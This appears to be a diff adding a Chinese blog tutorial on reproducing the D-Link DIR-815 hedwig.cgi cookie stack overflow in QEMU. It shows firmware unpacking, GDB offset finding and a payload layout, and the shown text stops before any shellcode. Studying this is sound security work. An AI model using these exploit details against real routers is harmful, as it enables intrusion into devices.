@@ -1,0 +1,711 @@
+  <!DOCTYPE html>
+  <html lang="zh-CN"  
+      data-theme-mode="auto"
+  >
+  <head>
+  <meta charset="utf-8">
+  
+  
+  
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_ex15nbittbh';window.REIMU_CONFIG.clipboard_tips = {"success":{"zh-CN":"复制成功 (*^▽^*)"},"fail":{"zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":true,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = '本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://nexlvi.github.io';window.REIMU_CONFIG.relative = '/';</script>
+  <title>
+    DIR-815漏洞复现 | Nexlvi&#39;s Blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_ex15nbittbh.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+    <meta name="description" content="漏洞编号：CNVD-2013-11625 目标固件：DIR815A1_FW103b01.bin（D-Link DIR-815 Rev.A 1.03b01） 架构：MIPS32 Little Endian 复现方式：QEMU user-mode 本地仿真，无需真实路由器   第一步：解包固件，找到文件系统  0. 你需要提前装好的工具 笔者这里使用的是arch linux，下载可根据自身系统调整">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DIR-815漏洞复现">
+<meta property="og:url" content="https://nexlvi.github.io/2026/05/20/DIR-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="Nexlvi&#39;s Blog">
+<meta property="og:description" content="漏洞编号：CNVD-2013-11625 目标固件：DIR815A1_FW103b01.bin（D-Link DIR-815 Rev.A 1.03b01） 架构：MIPS32 Little Endian 复现方式：QEMU user-mode 本地仿真，无需真实路由器   第一步：解包固件，找到文件系统  0. 你需要提前装好的工具 笔者这里使用的是arch linux，下载可根据自身系统调整">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-05-20T11:29:06.000Z">
+<meta property="article:modified_time" content="2026-08-07T13:51:10.375Z">
+<meta property="article:author" content="Nexlvi">
+<meta property="article:tag" content="学习笔记">
+<meta property="article:tag" content="IOT">
+<meta name="twitter:card" content="summary">
+    <link rel="alternate" href="/atom.xml" title="Nexlvi's Blog" type="application/atom+xml">
+    <link rel="shortcut icon" href="https://github.com/Nexlvi.png">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx/1oA/0l8ysE" crossorigin="anonymous">
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+      <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+        <a class="main-nav-link-wrap" href="/">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">首页</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/archives">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">归档</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/about">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">关于</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/friend">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">友链</span>
+        </a>
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" aria-label="RSS 订阅" target="_blank"></a>
+  </nav>
+</div>
+<header id="header" aria-label="Site header">
+    <picture></picture>
+    <img  fetchpriority="high" src="/images/dir.jpg" alt="DIR-815漏洞复现">
+  <div id="header-outer">
+    <div id="header-title">
+          <span id="logo">
+            <h1 data-aos="slide-up">DIR-815漏洞复现</h1>
+          </span>
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+        </h2>
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content"  class="sidebar-right" >
+          <aside id="sidebar" aria-label="Sidebar">
+  <div class="sidebar-wrapper-container sticky">
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5%E8%A7%A3%E5%8C%85%E5%9B%BA%E4%BB%B6%E6%89%BE%E5%88%B0%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F"><span class="toc-number">1.</span> <span class="toc-text"> 第一步：解包固件，找到文件系统</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0-%E4%BD%A0%E9%9C%80%E8%A6%81%E6%8F%90%E5%89%8D%E8%A3%85%E5%A5%BD%E7%9A%84%E5%B7%A5%E5%85%B7"><span class="toc-number">1.1.</span> <span class="toc-text"> 0. 你需要提前装好的工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11-%E4%B8%8B%E8%BD%BD%E5%9B%BA%E4%BB%B6"><span class="toc-number">1.2.</span> <span class="toc-text"> 1.1 下载固件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#12-%E7%94%A8-binwalk-%E8%A7%A3%E5%8C%85"><span class="toc-number">1.3.</span> <span class="toc-text"> 1.2 用 binwalk 解包</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5%E6%89%BE%E5%88%B0%E6%BC%8F%E6%B4%9E%E6%89%80%E5%9C%A8%E7%9A%84%E6%96%87%E4%BB%B6"><span class="toc-number">2.</span> <span class="toc-text"> 第二步：找到漏洞所在的文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#21-%E4%BB%8E-http-%E5%85%A5%E5%8F%A3%E5%BC%80%E5%A7%8B%E6%89%BE"><span class="toc-number">2.1.</span> <span class="toc-text"> 2.1 从 HTTP 入口开始找</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#22-%E7%A1%AE%E8%AE%A4-cgibin-%E7%9A%84%E6%9E%B6%E6%9E%84%E4%BB%A5%E5%8F%8A%E4%BF%9D%E6%8A%A4"><span class="toc-number">2.2.</span> <span class="toc-text"> 2.2 确认 cgibin 的架构以及保护</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%AD%A5gdb-%E8%B0%83%E8%AF%95%E7%B2%BE%E7%A1%AE%E5%AE%9A%E4%BD%8D%E5%81%8F%E7%A7%BB"><span class="toc-number">3.</span> <span class="toc-text"> 第三步：GDB 调试，精确定位偏移</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#31-%E7%94%A8-de-bruijn-%E5%BA%8F%E5%88%97%E5%AE%9A%E4%BD%8D-ra-%E5%81%8F%E7%A7%BB"><span class="toc-number">3.1.</span> <span class="toc-text"> 3.1 用 De Bruijn 序列定位 $ra 偏移</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#32-%E5%81%8F%E7%A7%BB-1032-%E7%9A%84%E9%99%B7%E9%98%B1sigbus"><span class="toc-number">3.2.</span> <span class="toc-text"> 3.2 偏移 1032 的陷阱：SIGBUS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E6%AD%A5%E7%A1%AE%E8%AE%A4%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80%E6%89%BE-shellcode-%E8%90%BD%E7%82%B9"><span class="toc-number">4.</span> <span class="toc-text"> 第四步：确认内存布局，找 shellcode 落点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#41-%E5%90%84%E6%AE%B5%E5%8A%A0%E8%BD%BD%E5%9C%A8%E5%93%AA"><span class="toc-number">4.1.</span> <span class="toc-text"> 4.1 各段加载在哪</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#42-%E6%8E%A2%E9%92%88-payload-%E5%AE%9E%E6%B5%8B-shellcode-%E8%90%BD%E7%82%B9"><span class="toc-number">4.2.</span> <span class="toc-text"> 4.2 探针 payload 实测 shellcode 落点</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E6%AD%A5%E7%BC%96%E5%86%99-mips-le-shellcode"><span class="toc-number">5.</span> <span class="toc-text"> 第五步：编写 MIPS LE shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pasted-image-20260807205224png"><span class="toc-number">6.</span> <span class="toc-text"> ![[Pasted image 20260807205224.png]]</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%8A%A5%E9%94%99%E4%B8%8E%E6%8E%92%E6%9F%A5"><span class="toc-number">7.</span> <span class="toc-text"> 常见报错与排查</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">8.</span> <span class="toc-text"> 总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">9.</span> <span class="toc-text"> 参考</span></a></li></ol>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/Nexlvi.jpg" data-sizes="auto" alt="Nexlvi" class="lazyload">
+  <div class="sidebar-author-name">Nexlvi</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">2</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">4</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/Nexlvi/ itemprop="url" target="_blank" aria-label="github" rel="noopener nofollow noreferrer"></a>
+    </div>
+    <div class="icon-bilibili sidebar-social-icon">
+      <a href=https://space.bilibili.com/491457782 itemprop="url" target="_blank" aria-label="bilibili" rel="noopener nofollow noreferrer"></a>
+    </div>
+    <div class="icon-qq sidebar-social-icon">
+      <a href=2896275217 itemprop="url" target="_blank" aria-label="qq" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+</div>
+</div>
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+    </div>
+  </div>
+  <div class="sidebar-widget">
+  </div>
+  </div>
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-DIR-815漏洞复现" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2026-05-20T11:29:06.000Z" itemprop="datePublished">2026-05-20</time>
+    <time style="display: none;" id="post-update-time">2026-08-07</time>
+  </span>
+</div>
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+        <blockquote>
+<p>漏洞编号：CNVD-2013-11625<br />
+目标固件：<code>DIR815A1_FW103b01.bin</code>（D-Link DIR-815 Rev.A 1.03b01）<br />
+架构：MIPS32 Little Endian<br />
+复现方式：<strong>QEMU user-mode 本地仿真，无需真实路由器</strong></p>
+</blockquote>
+<h2 id="第一步解包固件找到文件系统"><a class="markdownIt-Anchor" href="#第一步解包固件找到文件系统"></a> 第一步：解包固件，找到文件系统</h2>
+<h3 id="0-你需要提前装好的工具"><a class="markdownIt-Anchor" href="#0-你需要提前装好的工具"></a> 0. 你需要提前装好的工具</h3>
+<p>笔者这里使用的是arch linux，下载可根据自身系统调整</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Arch Linux</span></span><br><span class="line"><span class="built_in">sudo</span> pacman -S qemu-user qemu-user-static binwalk gdb python python-pip</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python 库</span></span><br><span class="line">pip install pwntools keystone-engine --break-system-packages</span><br></pre></td></tr></table></figure>
+<p>确认 QEMU MIPS 可用：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">qemu-mipsel --version</span><br><span class="line"><span class="comment"># 输出：qemu-mipsel version 8.x.x</span></span><br></pre></td></tr></table></figure>
+<p>![[Pasted image 20260521015522.png]]</p>
+<h3 id="11-下载固件"><a class="markdownIt-Anchor" href="#11-下载固件"></a> 1.1 下载固件</h3>
+<blockquote>
+<p>注：固件安装包待补充（可自行搜索 <code>DIR815A1_FW103b01.bin</code> 下载）。</p>
+</blockquote>
+<h3 id="12-用-binwalk-解包"><a class="markdownIt-Anchor" href="#12-用-binwalk-解包"></a> 1.2 用 binwalk 解包</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -eM DIR815A1_FW103b01.bin</span><br></pre></td></tr></table></figure>
+<p>![[Pasted image 20260521020037.png]]</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find ~/IOT/extractions -<span class="built_in">type</span> d -name <span class="string">&quot;squashfs-root&quot;</span> 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<p>![[Pasted image 20260521020601.png]]<br />
+设置全局变量方便后续使用</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> iot1=~/IOT/extractions/DIR815A1_FW103b01.bin.extracted/F008C/squashfs-root</span><br></pre></td></tr></table></figure>
+<p>![[Pasted image 20260521021035.png]]</p>
+<h2 id="第二步找到漏洞所在的文件"><a class="markdownIt-Anchor" href="#第二步找到漏洞所在的文件"></a> 第二步：找到漏洞所在的文件</h2>
+<h3 id="21-从-http-入口开始找"><a class="markdownIt-Anchor" href="#21-从-http-入口开始找"></a> 2.1 从 HTTP 入口开始找</h3>
+<p>路由器的 Web 界面通过 CGI 程序处理请求。先看 Web 目录：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> <span class="variable">$iot1</span>/htdocs/web/</span><br><span class="line"><span class="built_in">ls</span> -la <span class="variable">$iot1</span>/htdocs/web/*.cgi | <span class="built_in">head</span> -10</span><br></pre></td></tr></table></figure>
+<p>你会发现：<br />
+![[Pasted image 20260521021717.png]]</p>
+<p><strong>所有 <code>.cgi</code> 文件都是软链接，全部指向同一个真实二进制 <code>/htdocs/cgibin</code>。</strong></p>
+<p>这个 <code>cgibin</code> 根据被调用时的文件名（<code>argv[0]</code>）来决定执行哪个功能——类似 BusyBox 的做法。</p>
+<h3 id="22-确认-cgibin-的架构以及保护"><a class="markdownIt-Anchor" href="#22-确认-cgibin-的架构以及保护"></a> 2.2 确认 cgibin 的架构以及保护</h3>
+<p>![[Pasted image 20260521021953.png]]</p>
+<p>关键信息：</p>
+<ul>
+<li><strong>MIPS 32-bit Little Endian</strong>（LSB = Least Significant Byte first）</li>
+<li><strong>动态链接</strong>，依赖 uClibc（嵌入式 Linux 精简版 libc）</li>
+<li><strong>stripped</strong>（符号表被删除，没有函数名）</li>
+</ul>
+<p><strong>安全保护情况：</strong></p>
+<table>
+<thead>
+<tr>
+<th>保护</th>
+<th>状态</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>NX（栈不可执行）</td>
+<td>❌ 无</td>
+</tr>
+<tr>
+<td>Stack Canary</td>
+<td>❌ 无</td>
+</tr>
+<tr>
+<td>PIE（地址随机化）</td>
+<td>❌ 无</td>
+</tr>
+<tr>
+<td>RELRO</td>
+<td>❌ 无</td>
+</tr>
+</tbody>
+</table>
+<p>没有任何保护 → 直接往栈上写 shellcode 然后跳过去执行，最简单的利用方式。</p>
+<p>首先这是本来就揭露的漏洞，本文章也主要是教学学习为主，所以我们已知漏洞点函数为hedwigcgi_main</p>
+<p>![[Pasted image 20260521023753.png]]</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">hedwigcgi_main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">1024</span>];  <span class="comment">// 栈上固定大小缓冲区</span></span><br><span class="line">    <span class="type">char</span> *cookie = getenv(<span class="string">&quot;HTTP_COOKIE&quot;</span>);  <span class="comment">// 从环境变量读 cookie</span></span><br><span class="line">    <span class="comment">// 解析 uid= 参数</span></span><br><span class="line">    <span class="type">char</span> *uid = sess_get_uid(cookie);</span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">&quot;%s&quot;</span>, uid);  <span class="comment">// ← 没有长度限制，直接写入 buf！</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>sprintf(buf, &quot;%s&quot;, uid)</code> 把用户可控的 <code>uid</code> 无限制地写进 1024 字节的栈缓冲区 → <strong>经典栈溢出</strong>。</p>
+<hr />
+<h2 id="第三步gdb-调试精确定位偏移"><a class="markdownIt-Anchor" href="#第三步gdb-调试精确定位偏移"></a> 第三步：GDB 调试，精确定位偏移</h2>
+<blockquote>
+<p>知道能溢出还不够，要精确知道 payload 的<strong>第几个字节</strong>覆盖了 <code>$ra</code>。</p>
+</blockquote>
+<h3 id="31-用-de-bruijn-序列定位-ra-偏移"><a class="markdownIt-Anchor" href="#31-用-de-bruijn-序列定位-ra-偏移"></a> 3.1 用 De Bruijn 序列定位 $ra 偏移</h3>
+<p>发 1100 个 A 只能证明溢出存在。De Bruijn 序列（pwntools 的 <code>cyclic</code>）任意连续 4 字节全局唯一，崩溃时看 <code>$pc</code> 就能反查偏移。<br />
+<strong>终端 1 —— 启动 QEMU：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> R=~/CTFer/iot-env/firmware/extractions/DIR815A1_FW103b01.bin.extracted/F008C/squashfs-root</span><br><span class="line">PATTERN=$(python3 -c <span class="string">&quot;from pwn import cyclic; print(cyclic(1100, n=4).decode())&quot;</span>)</span><br><span class="line"></span><br><span class="line">qemu-mipsel -L <span class="variable">$R</span> -g 1234 -0 hedwig.cgi \</span><br><span class="line">  -E REQUEST_METHOD=POST -E CONTENT_LENGTH=0 \</span><br><span class="line">  -E CONTENT_TYPE=application/x-www-form-urlencoded \</span><br><span class="line">  -E REQUEST_URI=/hedwig.cgi -E REMOTE_ADDR=127.0.0.1 \</span><br><span class="line">  -E <span class="string">&quot;HTTP_COOKIE=uid=<span class="variable">$PATTERN</span>&quot;</span> <span class="variable">$R</span>/htdocs/cgibin</span><br></pre></td></tr></table></figure>
+<p><strong>终端 2 —— 连接 GDB：</strong></p>
+<p>本机用 <code>gdb</code> 就行（gdb 17.2 支持 MIPS；装了 <code>gdb-multiarch</code> 的发行版用它也一样）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb -q ~/CTFer/iot-env/firmware/extractions/DIR815A1_FW103b01.bin.extracted/F008C/squashfs-root/htdocs/cgibin</span><br></pre></td></tr></table></figure>
+<p>然后在 GDB 里依次敲三条命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(gdb) set architecture mips</span><br><span class="line">(gdb) target remote :1234</span><br><span class="line">(gdb) c</span><br></pre></td></tr></table></figure>
+<p><code>c</code> 之后程序带着 1100 字节的 cyclic 序列跑起来，直接崩溃：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x61616c6b in ?? ()</span><br></pre></td></tr></table></figure>
+<p>![[Pasted image 20260807203543.png]]</p>
+<p><code>0x61616c6b</code> 就是 cyclic 序列里被写进 <code>$ra</code> 的那 4 个字节——是个无效地址，CPU 跳过去就崩了。</p>
+<blockquote>
+<p>⚠️ <strong>崩溃值因 QEMU 版本而异</strong>：本文环境（QEMU 11.0.2）实测是 <code>0x61616c6b</code>；早期 QEMU 8.x 实测是 <code>0x6b61616c</code>。<strong>以你自己 GDB 看到的实际值为准</strong>，方法不变，两种值算出来的偏移都是 1043。</p>
+</blockquote>
+<p><strong>看寄存器，确认是 <code>jr $ra</code> 导致的跳转：</strong></p>
+<p>![[Pasted image 20260807205853.png]]</p>
+<blockquote>
+<p>为什么 <code>to_bytes(4, 'little')</code>？MIPS 小端下 <code>0x61616c6b</code> 在内存里实际是 <code>6b 6c 61 61</code>（低字节在前），cyclic_find 搜索的是原始字节序列，必须转成小端字节再搜。</p>
+</blockquote>
+<p><strong>$ra 偏移 = 1043</strong> 📌 —— 意思是 payload 的第 1043 字节开始的那 4 字节，会覆盖 <code>$ra</code>。</p>
+<h3 id="32-偏移-1032-的陷阱sigbus"><a class="markdownIt-Anchor" href="#32-偏移-1032-的陷阱sigbus"></a> 3.2 偏移 1032 的陷阱：SIGBUS</h3>
+<p>调试中发现一个坑：payload 不够长时崩溃的是 <code>SIGBUS</code> 而不是 <code>SIGSEGV</code>。</p>
+<p><strong>原因：</strong> <code>hedwigcgi_main</code> 的尾声除了恢复 <code>$ra</code>，还会恢复若干 <code>$s0~$s7</code>，其中<strong>偏移 1032 处</strong>的寄存器在函数返回前会被当成指针解引用。如果那里是 <code>0x41414141</code>（无效地址），程序还没走到 <code>jr $ra</code> 就先崩了。</p>
+<p><strong>解决：</strong> 偏移 1032 处放一个合法栈地址（如 <code>0x2b2aad30</code>，在栈范围内），让解引用顺利通过，走到 <code>jr $ra</code>。</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload 布局（前半段）：</span><br><span class="line">[0]      &quot;A&quot; × 1032</span><br><span class="line">[1032]   0x2b2aad30（合法栈地址，绕过 SIGBUS）</span><br><span class="line">[1036]   &quot;C&quot; × 7</span><br><span class="line">[1043]   $ra = shellcode 地址 ← 从这里开始控制流</span><br></pre></td></tr></table></figure>
+<hr />
+<h2 id="第四步确认内存布局找-shellcode-落点"><a class="markdownIt-Anchor" href="#第四步确认内存布局找-shellcode-落点"></a> 第四步：确认内存布局，找 shellcode 落点</h2>
+<h3 id="41-各段加载在哪"><a class="markdownIt-Anchor" href="#41-各段加载在哪"></a> 4.1 各段加载在哪</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(gdb) break printf        # 断在 libc 函数，此时所有段都已加载</span><br><span class="line">(gdb) c</span><br><span class="line">(gdb) info proc mappings</span><br></pre></td></tr></table></figure>
+<p>![[Pasted image 20260807203841.png]]</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Start Addr   End Addr     Size     objfile</span><br><span class="line">0x00400000 0x0041c000  0x1c000   /htdocs/cgibin          ← 主程序（无 PIE，固定）</span><br><span class="line">0x2b2b0000 0x2b2b5000  0x5000    /lib/ld-uClibc.so.0     ← 动态链接器</span><br><span class="line">0x2b300000 0x2b35e000  0x5e000   /lib/libuClibc-0.9.30.1.so ← libc</span><br><span class="line">0x2aaac000 0x2b2ac000  0x800000  [stack]                 ← 栈</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>⚠️ <strong>这些地址会随 QEMU 版本漂移！</strong> 上表是 QEMU 11.0.2 实测值。笔者 5 月第一次复现时 QEMU 还是 8.x，当时栈在 <code>0x2aaac000~0x2baac000</code>、shellcode 落点 <code>0x2baab880</code>；后面换到 QEMU 11.0.2 后栈基址整体下移了 1MB，旧地址全部失效。<strong>换环境/换版本必须重新实测</strong>——好在方法不变：GDB 探针测 <code>$sp</code>、<code>info proc mappings</code> 看栈范围。</p>
+</blockquote>
+<p>QEMU user-mode 默认关 ASLR，所以每次运行布局完全一致，shellcode 地址可以写死。</p>
+<h3 id="42-探针-payload-实测-shellcode-落点"><a class="markdownIt-Anchor" href="#42-探针-payload-实测-shellcode-落点"></a> 4.2 探针 payload 实测 shellcode 落点</h3>
